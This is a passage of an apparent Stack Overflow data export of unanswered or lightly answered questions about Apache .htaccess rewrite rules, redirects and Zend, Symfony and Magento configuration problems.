%{HTTP_HOST} ^(www.)?mysite.com$\nRewriteCond %{REQUEST_URI} !public/\nRewriteRule page-(.*)/es$ public/index.php?page=$1&amp;lang=es [L]\n</code></pre>\n\n<p>Internally the parameter page is not getting received so the site shows the home page instead. I am not sure if I have this rule wrong or if it is just conflicting with the other rules which are working perfectly, or if it is an order problem.</p>\n\n<p>All help is greatly appreciated.\nThanks in advance.</p>\n\n<p>Below is the full htaccess file on the root of my site, in case you want to take a look at it.</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\n\nDirectoryIndex index.php\n\n#Adds www to the domain\nRewriteBase /\nRewriteCond %{HTTP_HOST} !^www.mysite.com$ [NC]\nRewriteRule ^(.*)$ http://www.mysite.com/$1 [L,R=301]\n\n#redirect from www.mysite.com/es to www.mysite.com/public/index.php?lang=es\nRewriteCond %{HTTP_HOST} ^(www.)?mysite.com$\nRewriteCond %{REQUEST_URI} !public/\nRewriteRule /es$ public/index.php?lang=es [L]\n\n#redirect from www.mysite.com/en to www.mysite.com/public/index.php?lang=en\nRewriteCond %{HTTP_HOST} ^(www.)?mysite.com$\nRewriteCond %{REQUEST_URI} !public/\nRewriteRule /en$ public/index.php?lang=en [L]\n\n#redirect from www.mysite.com/ to www.mysite.com/public/index.php\nRewriteCond %{HTTP_HOST} ^(www.)?mysite.com$\nRewriteCond %{REQUEST_URI} !public/\nRewriteRule ^(/)?$ public/index.php [L]\n\n#redirect from www.mysite.com/page-NAME/es to www.mysite.com/public/index.php?page=NAME/es\nRewriteCond %{HTTP_HOST} ^(www.)?mysite.com$\nRewriteCond %{REQUEST_URI} !public/\nRewriteRule page-(.*)/es$ public/index.php?page=$1&amp;lang=es [L]\n\n#redirect from www.mysite.com/page-NAME to www.mysite.com/public/index.php?page=NAME\nRewriteCond %{HTTP_HOST} ^(www.)?mysite.com$\nRewriteCond %{REQUEST_URI} !public/\nRewriteRule page-(.*)$ public/index.php?page=$1 [L]\n\n#redirect from www.mysite.com/ to www.mysite.com/public/\nRewriteCond %{HTTP_HOST} ^(www.)?mysite.com$\nRewriteCond %{REQUEST_URI} !public/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ public/$1 [L]\n</code></pre>\n"},{"tags":["php",".htaccess","symfony2","shared-hosting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12229872,"title":"No access to images","body":"<p>I installed Symfony2 on a shared server, the problem is that I can't view the images that I call in my template.</p>\n\n<p>My pictures are in ~/myApplication/web/images directory.</p>\n\n<p>I tried these methods in my twig template:</p>\n\n<pre><code>&lt;img src=\"{{ asset('images/t.png') }}\" alt=\"Twitter\"/&gt;\n&lt;img src=\"{{ asset('web/images/t.png') }}\" alt=\"Twitter\"/&gt;\n&lt;img src=\"http://domain.fr/web/{{ asset('images/t.png') }}\" alt=\"Twitter\"/&gt;\n&lt;img src=\"http://domain.fr/web/images/t.png\" alt=\"Twitter\"/&gt;\n</code></pre>\n\n<p>But each time it is transcribed by <code>http://domain.fr/web/images/t.png</code> then I would have <code>http://domain.fr/web/images/t.png</code>.</p>\n\n<p>I think it's a .htaccess problem but I don't what...</p>\n\n<p>My .htaccess to the root of the Application:</p>\n\n<pre><code>SetEnv SHORT_OPEN_TAGS 0\nSetEnv REGISTER_GLOBALS 0\nSetEnv MAGIC_QUOTES 0\nSetEnv SESSION_AUTOSTART 0\nSetEnv ZEND_OPTIMIZER 1\nSetEnv PHP_VER 5_3\nAddType x-mapp-php5 .php\n\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ web/app.php [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Someone may have an idea of ​​what this is?</p>\n\n<p>I have no problem with CSS or JS files because I added this to my config:</p>\n\n<pre><code>framework:\n    templating:\n        assets_base_urls: http://domain.fr/web/\n</code></pre>\n\n<p>Thanks for your help</p>\n"},{"tags":["apache",".htaccess","redirect","virtualhost","vhosts"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12228025,"title":"Redirect if IP-address is allowed","body":"<p>I have created a subdomain named phpmyadmin.domain, but now I want a .htaccess with the allowed IP's inside the subdomain's path instead of placed at the PHPMyAdmin installed path (I have installed both PHPMyAdmin and Apache using <code>apt-get</code>). This is due to allow different IPs to access PHPMyAdmin if they are using the right site.</p>\n\n<p>E.g. if an IP-address is listed inside phpmyadmin.example.com's .htaccess-file, they have access to PHPMyAdmin using this site, but if they access phpmyadmin.example2.com and they are not listed inside their .htaccess-file, they are not allowed to access PHPMyAdmin using that subdomain</p>\n\n<p>If they are not allowed, they should either go to the default 'not allowed'-page or a custom page defined inside this .htaccess-file</p>\n\n<p>Can this be done easily and how?</p>\n"},{"tags":["php",".htaccess","rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":89,"score":-4,"question_id":12138697,"title":".htaccess Rewrite .php to 'virtual folder'","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4026021/remove-php-extension-with-htaccess\">remove .php extension with .htaccess</a>  </p>\n</blockquote>\n\n\n\n<p>I have</p>\n\n<pre><code>http://www.example.com/test/categoryform.php\n</code></pre>\n\n<p>In my .htaccess file, how do I rewrite that to display as:</p>\n\n<pre><code>http://www.example.com/test/categoryform/\n</code></pre>\n"},{"tags":["php",".htaccess","redirectstandardoutput"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12229222,"title":"Turn text after slashes into variables with HTACCESS","body":"<p>I need to pass 3 variables with a URL but using slashes. So for example I would use this URL:</p>\n\n<p><a href=\"http://www.example.com/variable1/variable2/variable3\" rel=\"nofollow\">http://www.example.com/variable1/variable2/variable3</a></p>\n\n<p>I have this in my HTACCESS which allows the text after the first variable to be passed but I can't get the other two to come through, even if I add &amp;$2</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule /?([A-Za-z0-9_-]+)/?$ process.php?width=$1&amp;height=$2 [QSA,L]\n</code></pre>\n\n<p></p>\n\n<p>Any links or help would be great</p>\n"},{"tags":[".htaccess","litespeed"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12220181,"title":"htaccess Apache to Litespeed","body":"<p>I'm using the following rewrite on my dev environment (Apache 2) and it works fine, I uploaded to my live environment (LiteSpeed) and it no longer works :(</p>\n\n<p>Any ideas why given the following?</p>\n\n<p>I'm using the \"P\" directive \"mod_proxy\" which my host doesn't support. How can I get around this?</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  Options +FollowSymLinks\n  RewriteEngine On\n\n  RewriteBase /\n\n  RewriteCond $1 !\\.(gif|jpe?g|png)$ [NC]\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{HTTP_HOST} !^www\\. [NC]\n  RewriteCond %{HTTP_HOST} ^([^.]+)\\.example\\.com\n  RewriteRule ^(.*)$ http://example.com/folder/%1/$1 [QSA,NC,P]\n\n  # Removes index.php\n  RewriteCond $1 !\\.(gif|jpe?g|png)$ [NC]\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule ^(.*)$ index.php?/$1 [L]\n\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","web-config"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12228221,"title":"Convert .htaccess to web.config 1","body":"<p>how to convert .htaccess to web.config?</p>\n\n<pre><code>Options All -FollowSymLinks -MultiViews -Indexes\nDirectoryIndex bot.php\n&lt;FilesMatch \"\\.(htaccess|php|xml|ini)$\"&gt;\n    Order Allow,Deny\n    Deny from all\n    Satisfy all\n&lt;/FilesMatch&gt;\n&lt;FilesMatch \"bot\\.php\"&gt;\n    Order Allow,Deny\n    Allow from all\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>Thanks :)</p>\n"},{"tags":[".htaccess","rewrite","typo3","realurl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12218508,"title":"TYPO3: only have .html at the end of each URL","body":"<p>I'm using RealURL and the website can be reached by</p>\n\n<p><code>www.domain.com/sitemap.html</code> and <code>www.domain.com/sitemap</code></p>\n\n<p>Now the website should be only reachable by</p>\n\n<p><code>www.domain.com/sitemap.html</code></p>\n\n<p>How can this be done?</p>\n\n<p>I found the config <code>'defaultToHTMLsuffixOnPrev' =&gt; '.html'</code>, but I don't know if this is the right option. Also there are some possibilities with <code>.htaccess</code>, but this should be only valid for sites (not pictures, pdfs ...). What is the right way doing this?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12226795,"title":"https to http 301 redirect via htaccess","body":"<p>I'm trying to redirect all the https url to http. As my new server doesn't have ssl enabled. </p>\n\n<p>So Far I tried following but none of them worked.'</p>\n\n<pre><code>RewriteCond %{HTTPS} off\nRewriteRule ^(.*)$ http://%{SERVER_NAME}%{REQUEST_URI} [R=301] \n\nRewriteCond %{HTTPS} !=on\nRewriteRule ^(.*)$ http://%{SERVER_NAME}%{REQUEST_URI} [R=301,L]\n\nRewriteCond %{HTTPS} on\nRewriteRule (.*) http://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]\n</code></pre>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12226168,"title":"Htaccess rewrite from one file to another","body":"<p>I need to redirect all queries to file 1.php to file 2.php. So I need if somebody will ask 1.php server will give him 2.php. 1.php and 2.php are in the same folder.</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^2.php 1.php\n</code></pre>\n\n<p>This code in htaccess doesn't work. Where is the mistake?</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12224953,"title":".htaccess to pass FULL URL into other PHP link as $_GET","body":"<p>From <code>.htacces</code> file, how to pass/redirect the FULL URL to another URL as GET Variable?</p>\n\n<p>Like:</p>\n\n<pre><code>http://www.test.com/foo/bar.asp\n</code></pre>\n\n<p>will be redirected to:</p>\n\n<pre><code>http://www.newsite.com/?url=http://www.test.com/foo/bar.asp\n</code></pre>\n\n<p>With <strong>Full Url with Domain</strong>.<br>I tried:</p>\n\n<pre><code>RewriteEngine on\nRedirectMatch 301 ^/(.*)\\.asp http://www.newsite.com/?url=%{REQUEST_URI}\n</code></pre>\n\n<p>But it is going out like:</p>\n\n<pre><code>http://www.newsite.com/?url=?%{REQUEST_URI}\n</code></pre>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12224189,"title":"htaccess rewriterule and directoryindex","body":"<p>I'm having issues with my rewriterule and directory index</p>\n\n<pre><code>DirectoryIndex invite.php about.php account.php\n\nRewriteRule ^/?([a-z0-9_-]+)/?$ /user.php?u=$1 [L]\n</code></pre>\n\n<p>Lets say <code>about.php</code> is in the about folder. When i go to www.url.com/about/about.php, it works fine. But when I go to <code>www.url.com/about/</code>, it goes to my <code>user.php</code> page. When I go to <code>www.url.com/about</code>, (without ending slash), it goes to <code>www.url/about/?u=about</code></p>\n\n<p>Can anyone help me?</p>\n\n<p>At the same time, I'm trying to set up where user can go to <code>www.url.com/andrewliu</code> instead of <code>www.url.com/user.php?u=andrewliu</code></p>\n\n<p>I guess I need to somehow fix my ending slash and the redirect?</p>\n\n<p>Thanks!</p>\n\n<p>EDIT</p>\n\n<p>I have this</p>\n\n<pre><code>DirectoryIndex invite.php about.php account.php\n\nRewriteEngine on \nRewriteCond %{REQUEST_FILENAME} !-d \nRewriteCond %{REQUEST_FILENAME}\\.php -f \nRewriteRule ^(.*)$ $1.php\nRewriteRule ^/?([a-z0-9_-]+)/?$ /user.php?u=$1 [L]\nRewriteCond %{QUERY_STRING} !^b= [NC]\nRewriteRule ^(business)/(.*)$ /$1/index.php?b=$2 [L,NC,QSA]\n</code></pre>\n"},{"tags":["wordpress",".htaccess","slider","rewrite","query-string"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12223726,"title":".htaccess permanent redirect of query string to directory","body":"<p>I'm trying to use .htaccess redirect to solve my slider post issue on my wordpress site.</p>\n\n<p>My current \"slider post\" URL is as follow leading to a blank post:\n<a href=\"http://mysite.com/?slider=post-slug\" rel=\"nofollow\">http://mysite.com/?slider=post-slug</a></p>\n\n<p>I want to redirect to the real post location with an identical \"post slug\":\n<a href=\"http://mysite.com/news/post-slug\" rel=\"nofollow\">http://mysite.com/news/post-slug</a></p>\n\n<p>How do I set my rewrite rules?</p>\n"},{"tags":[".htaccess","pattern-matching","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12223379,"title":".htaccess rewriterule not working for specific page","body":"<p>I have a rewrite rule which is driving me nuts. The rule is:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} c=8\nRewriteRule ^catalogue/index\\.php$ http://www.domain.co.uk/accessories/? [NC,L,R=301]\n</code></pre>\n\n<p>which will not work for:</p>\n\n<pre><code>http://www.domain.co.uk/catalogue/index.php?c=8\n</code></pre>\n\n<p>but this will work:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} c=8\nRewriteRule ^(.*)$ http://www.domain.co.uk/accessories/? [NC,L,R=301]\n</code></pre>\n\n<p>however I cannot use this script as I need to specify the catalogue/index.php so as not to rewrite other pages. Please help :(</p>\n\n<hr>\n\n<p>Here are a few lines of code that exist before mine:</p>\n\n<pre><code>Options +FollowSymlinks\n\n# Prevent Directoy listing \nOptions -Indexes\n\n# Prevent Direct Access to files\n&lt;FilesMatch \"\\.(tpl|ini|log)\"&gt;\nOrder deny,allow\nDeny from all\n&lt;/FilesMatch&gt;\n\n# SEO URL Settings\nRewriteEngine On\n# If your opencart installation does not run on the main web folder make sure you     folder it does run in ie. / becomes /shop/ \n\nRewriteBase /\nRewriteRule sitemap.xml /index.php?route=feed/google_sitemap\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^?]*) index.php?_route_=$1 [L,QSA]\n\n### Additional Settings that may need to be enabled for some servers \n### Uncomment the commands by removing the # sign in front of it.\n### If you get an \"Internal Server Error 500\" after enabling any of the following settings, restore the # as this means your host doesn't allow that.\n\n# 1. If your cart only allows you to add one item at a time, it is possible register_globals is on. This may work to disable it:\n# php_flag register_globals off\n\n# 2. If your cart has magic quotes enabled, This may work to disable it:\n# php_flag magic_quotes_gpc Off\n\n# 3. Set max upload file size. Most hosts will limit this and not allow it to be overridden but you can try\n# php_value upload_max_filesize 999M\n\n# 4. set max post size. uncomment this line if you have a lot of product options or are getting errors where forms are not saving all fields\n# php_value post_max_size 999M\n\n# 5. set max time script can take. uncomment this line if you have a lot of product options or are getting errors where forms are not saving all fields\n# php_value max_execution_time 200\n\n# 6. set max time for input to be recieved. Uncomment this line if you have a lot of product options or are getting errors where forms are not saving all fields\n</code></pre>\n"},{"tags":["php","apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12223535,"title":"How can I create requested image files when file not found?","body":"<p>For example, if I have a file <code>http://site.com/images/bird.jpg</code></p>\n\n<p>When I go <code>http://site.com/images/bird-200px-width.jpg</code> the server will say \"file not found\". </p>\n\n<p>When the server determines the file is not found, is there a way to check the /images/ directory to see if an image with the first part of the title (\"bird.jpg\"), and if it exists, automatically resize and generate an image with the requested filename instead of saying \"file not found\"?</p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":12221303,"title":"Using htaccess to remove .php and allow path","body":"<p>I currently have a .htaccess file that allows people to enter the URL without the php extension, such that <a href=\"http://domain.com/account\" rel=\"nofollow\">http://domain.com/account</a> redirects to account.php</p>\n\n<p>I would like to be able to have it so that if I enter <a href=\"http://domain.com/account/contactinfo\" rel=\"nofollow\">http://domain.com/account/contactinfo</a> (or <a href=\"http://domain.com/account/settings/groups\" rel=\"nofollow\">http://domain.com/account/settings/groups</a> and so on) it still goes to account.php, but I am not sure how to change what I have to achieve this.</p>\n\n<p>Current .htaccess :</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^(([A-Za-z0-9\\-_\\.]+/)*[A-Za-z0-9\\-_\\.]+)?$ $1.php\n</code></pre>\n\n<p>Any help appreciated! Obviously if there exists a folder it should follow that path (e.g. if /folder/page.php exists, then <a href=\"http://domain.com/folder/page/create\" rel=\"nofollow\">http://domain.com/folder/page/create</a> would go to folder/page.php)</p>\n"},{"tags":["jquery",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12221252,"title":"How pinterest type url's work","body":"<p>When we click on pinterest pin the url changes to pinterest.com/pin/[pinid]\nBut how come it happens without full loading of the page and only the url is changed.\n<img src=\"http://i.stack.imgur.com/JVmnI.jpg\" alt=\"enter image description here\">\n<img src=\"http://i.stack.imgur.com/LfYJk.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12204211,"title":"mod_rewrite rules not working as expected","body":"<p>I am using the following code</p>\n\n<pre><code>RewriteEngine on\nRewriteRule  ^/(certain|folders|on|server) - [NC,L]\nRewriteRule (.*) http://newserver/blog$1 [L,NS]\n</code></pre>\n\n<p>I would expect it to ignore my list of folders, and redirect to everything else. Instead, it seems to always be redirecting to \"newserver\". Changing the \"-\" to a URL in the first statement does work, but I don't actually want those folders directed anywhere.</p>\n\n<p>Why does my statement not work as expected?</p>\n\n<p>Also, I have noticed that for all the folders not listed, I have \"newserver/\", while the ones I listed are just \"newserver\" (no uri)</p>\n"},{"tags":["php",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":12218114,"title":"Htaccess URLRewrite","body":"<p>I've a question about URL Rewriting.<br>\nWhen I call a URL like this now:</p>\n\n<p><code>http://domein.ext/error/mysql/2/class.core.php/</code></p>\n\n<p>It will output this in de GET variables:</p>\n\n<pre><code>$_GET['type'] = mysql/2/class.core.php/.php/mysql\n$_GET['error'] = 2\n$_GET['file'] = class.core.php\n</code></pre>\n\n<p>But the TYPE isn't correct? This is my .htaccess:</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}.php -f\n\nRewriteRule ^(.*)$ $1.php\n\nRewriteRule ^index/password/ index.php?error=password\nRewriteRule ^error/(.*)/(.*)/(.*)/ error.php?type=$1&amp;error=$2&amp;file=$3\n</code></pre>\n\n<p>How can I fix this problem?\nAnd everything else works fine..</p>\n"},{"tags":[".htaccess","zend-framework","redirect","virtualhost","woff"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":12220434,"title":"Zend without virtualHost (redirect rules)","body":"<p>I've read several places trying to use ZendFramework directly from htdocs (without creating virtual servers) for every test environment I use. This is a development environment, that's the reason I don't care about security issues nor want to modify the hosts file every time. I work on Windows using xampp 1.7.3</p>\n\n<p>I recreate the zend structure but inside a folder into htdocs. Lets say: C:\\xampp\\htdocs\\project</p>\n\n<p>By now, I found a solution using the following .htaccess in the projects root</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^(.*)$ public/$1?%{QUERY_STRING} [QSA,L]\n</code></pre>\n\n<p>Inside C:\\xampp\\htdocs\\project\\public I use the default's Zend .htaccess</p>\n\n<pre><code>SetEnv APPLICATION_ENV development\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n\n<p>In my layout I add the <code>base</code> tag to redirect img, css and js links. My problem arises when I try to include a css font to my project (woff file) that's been redirected anywhere in the htaccess rules resulting in a 400 error code.</p>\n\n<p>So my question is: What's wrong here? how can I redirect every controller (php file) but no any other existing file</p>\n\n<p>By the way... I can't find the way to make htaccess files work by my own. I've always found myself searching for help :(</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12220295,"title":"PHP - mod_rewrite clean urls and query strings","body":"<pre><code>RewriteEngine On\n\nRewriteCond %{HTTP_HOST} ^www\\.(.+)\nRewriteCond %{HTTPS}s/%1 ^(on(s)|offs)/(.+)\nRewriteRule ^ http%2://%3%{REQUEST_URI}/site1 [L,R=301]\n\nRewriteRule ^/site1/catalogue/(\\w+)/([0-9]+)$ catalogue.php?category=$1&amp;product_id=$2 [QSA,L]\n</code></pre>\n\n<p>I'm having trouble with some mod_rewrites. I'm trying to accomplish 3 things:</p>\n\n<p>1) Remove www. from urls</p>\n\n<p>2) Remove the .php extensions</p>\n\n<p>3) Have clean urls involving $_GET variables (query strings?)</p>\n\n<p>For example, I would like this url:</p>\n\n<p><a href=\"http://www.domain.com/site1/catalogue.php?category=kitchen&amp;product_id=2\" rel=\"nofollow\">http://www.domain.com/site1/catalogue.php?category=kitchen&amp;product_id=2</a></p>\n\n<p>turned into this:</p>\n\n<p><a href=\"http://www.domain.com/site1/catalogue/kitchen/2\" rel=\"nofollow\">http://www.domain.com/site1/catalogue/kitchen/2</a></p>\n"},{"tags":["apache",".htaccess","zend-framework"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":119,"score":0,"question_id":12219274,"title":"Zend Framework setting up the htaccess file","body":"<p>I have been using the Zend Framework for years but have realised some crucial problems with our error handling that we are now fixing.\n(I posted a different question here: <a href=\"http://stackoverflow.com/questions/12197946/why-my-site-is-always-using-the-errorcontroller-for-all-types-of-errors-irrespec\">Why my site is always using the ErrorController for all types of errors irrespective of HTTP Status code?</a> explaining the story there).</p>\n\n<p>My question here is a quick one. What does a common .htaccess file of Zend Framework look like?</p>\n\n<p>According to the <a href=\"http://framework.zend.com/manual/en/zend.application.quick-start.html\" rel=\"nofollow\">latest ZF documentation</a>,     </p>\n\n<pre><code>SetEnv APPLICATION_ENV development\n\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n\n<p>However, the above is new to me - can someone explain what it does exactly?\nMy current .htaccess file has a lot of 301 redirect code but for the purpose of this post I'll only paste the relevant information here:</p>\n\n<pre><code>ErrorDocument 404 http://www.mydomain.com/pagenotfound/\nErrorDocument 503 http://www.mydomain.com/service-unavailable/\n\nRewriteCond %{REQUEST_URI} !^/liveagent\nRewriteCond %{REQUEST_URI} !^/blog\nRewriteRule !\\.(js|ico|gif|GIF|jpg|JPG|jpeg|png|PNG|pdf|css|html|xml|swf|php|mp3|mp4|webm|ogv|f4v|flv|txt|wsdl|css3|ttf|eot|svg|woff)$ index.php\n</code></pre>\n\n<p>The above has been working fine for us, and basically disallows the \"liveagent\" and \"blog\" (Wordpress) directories from running with Zend, but I realise I now need to make the following change:</p>\n\n<p>ErrorDocument 404 definitely has to be removed from the code, as Zend Framework should handle all errors. However, when I remove this, going to a URL like www.mydomain.com/this-does-not-exist.php results in a 404 error standard Apache page - it does not load the ZF or the ErrorController. This is because of the \"php\" exclusion in the above RewriteRule. I do not simply want to remove this since we sometimes want to be able to access php files on the root, such as a separate \"holding.php\" file which we use for putting the site on maintenance mode.</p>\n\n<p>What is the standard practice? Should I remove the php extension? However this will not solve other 404's like\nwww.mydomain.com/this-does-not-exist.css\nwhich is also an exclusion (i.e. CSS) in the above RewriteRule.</p>\n\n<p>Therefore, should I completely change the above to Zend's new code for .htaccess as I mentioned above?</p>\n\n<p>If so, I'm a sort of beginner at htaccess - how can I modify that .htaccess code to allow CSS, JS, video files etc. and the blog and liveagent directories to be excluded from the Zend Framework?</p>\n"},{"tags":[".htaccess","magento"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12215005,"title":"Magento crashes .htaccess","body":"<p>I have Magento instaled on shared hosting plan from godaddy, it keeps on crashing, I think it's because of the .htaccess file.\nMY htaccess file is <a href=\"http://pastebin.com/qUs1SDL3\" rel=\"nofollow\">http://pastebin.com/qUs1SDL3</a></p>\n"},{"tags":["php",".htaccess","url"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12219074,"title":"Pretty URLs with htaccess","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3899991/htaccess-rewrite-breaks-relative-paths\">htaccess rewrite breaks relative paths</a>  </p>\n</blockquote>\n\n\n\n<p>I am hoping someone can help me. I am trying to set my website to use pretty URLs.</p>\n\n<p>I currently have a few htaccess commands which hide my subdomain folder containing all my php files as well as a command to change my protocol from http to https and vice versa. The pretty url is proving to be difficult. I want to do it solely by htaccess and not php. I managed to write a command which worked but non of my css or javascript worked after that.</p>\n\n<pre><code># Redirect from website.com to www.website.com\nRewriteCond %{HTTP_HOST} ^website.com [NC]\nRewriteCond %{HTTP_HOST} !^www [NC]\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n\n# redirect url to www\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /defaultfolder/([^\\ ]+)\\ HTTP/\nRewriteRule ^(.*)$ defaultfolder/error.php [L]\n\n#this section hides the defaultfolder, tried to modify this code here to make friendly urls.\nRewriteCond %{HTTP_HOST} www.website.com\nRewriteCond %{REQUEST_URI} !defaultfolder/\nRewriteCond %{REQUEST_URI} !images/\nRewriteRule ^(.*)\\/$ defaultfolder/$1\\.php [L]\n\n#https redirect\nRewriteCond %{SERVER_PORT} 80\nRewriteCond %{REQUEST_URI} (/defaultfolder/)(login|securepages|pages)\\.php\nRewriteRule ^defaultfolder/(.*)$ https://www.website.com/$1 [R,L]\n\n#http redirect\nRewriteCond %{SERVER_PORT} 443\nRewriteCond %{REQUEST_URI} (/defaultfolder/)(index|nonsecure pages)\\.php\nRewriteRule  ^defaultfolder/(.*)$ http://www.website.com/$1 [R,L]\n</code></pre>\n"},{"tags":["apache",".htaccess","filenames","content-disposition","query-parameters"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12219110,"title":"Set Content-Disposition Filename from GET parameter in htaccess","body":"<p>I have something like this in a .htaccess</p>\n\n<pre><code>&lt;FilesMatch \"\\.(pdf)$\"&gt;\n  ForceType application/octet-stream\n  Header set Content-Disposition attachment\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>my requests look like this</p>\n\n<p><a href=\"http://example.com/files/foo.pdf?user=bob\" rel=\"nofollow\">http://example.com/files/foo.pdf?user=bob</a></p>\n\n<p>and I would like to set the filename of the downloaded file based on the user parameter, i.e. the browser should name the file \"foo-bob.pdf\".</p>\n\n<p>How do I access the query parameters and insert them in the Header directive in .htaccess?</p>\n"},{"tags":["php",".htaccess","image"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":3276663,"title":"Problem with htaccess (images)","body":"<pre><code>RewriteRule ([a-zA-Z0-9/_]+)/([0-9]+)x([0-9]+)_([0-9a-zA-Z_]+).([0-9a-zA-Z_]+)$ imgsize.php?&amp;w=$2&amp;h=$3img=$1/$4.$5 [L]\n</code></pre>\n\n<p>path to file:</p>\n\n<pre><code>/imgsize.php?w=200&amp;h=100&amp;img=uploads/elvita.jpg\n\n/uploads/100x110_elvita.jpg\n</code></pre>\n\n<p>why its not working? :(</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12218368,"title":"Is it possible to chain RewriteCond in htaccess?","body":"<p>I am going to be doing some basic <code>%{HTTP_HOST}</code> work in my <code>.htaccess</code> file and was wondering if it would be possible to do something similar to this:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ((foo|bar|baz).com)$\nRewriteCond %{DOCUMENT_ROOT}/apps/%1/webroot%{REQUEST_URI}  -d [OR]\nRewriteCond %{DOCUMENT_ROOT}/apps/%1/webroot%{REQUEST_URI}  -f\n  